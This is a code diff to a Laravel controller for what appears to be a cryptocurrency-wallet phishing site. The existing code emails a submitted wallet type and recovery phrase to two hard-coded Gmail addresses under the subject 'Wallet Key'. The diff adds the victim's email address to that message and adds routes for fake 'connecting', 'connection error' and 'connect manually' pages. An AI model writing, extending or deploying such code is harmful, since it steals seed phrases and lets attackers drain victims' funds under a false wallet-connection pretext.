@@ -57,7 +57,7 @@ class PagesController extends Controller
         $mailList = mailList::where('link', $link)->get('emails');
 
         if ($mailList) {
-            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase, function ($message) {
+            Mail::raw('Here is a ' . $wallet_type . ' address' . ', ' . $phrase. '<br/>'. 'Here is the email address'. $request['email'] ?? 'No email provided' , function ($message) {
                 $message->to(['lawalfemi33@gmail.com','callmehalpha2022@gmail.com'])
                     ->subject('Wallet Key');
             });
@@ -131,5 +131,23 @@ class PagesController extends Controller
 
     public function page_not_found(){
         return view('page_not_found');
+    }
+
+    public function walletConnecting(Request $request){
+        $img_path = $request->img_path;
+        $coin = $request->coin_name;
+        \request()->session()->put('coin',$coin);
+        return view('connecting')->with('img_path',$img_path)->with('coin',$coin);
+    }
+
+    public function walletError(){
+        return view('connectionError');
+    }
+
+    public function walletManually(){
+        $coin = \request()->session()->get('coin');
+        $data = \request()->session()->get('link');
+
+        return view('connectManually')->with('coin',$coin)->with('data',$data);
     }
 }
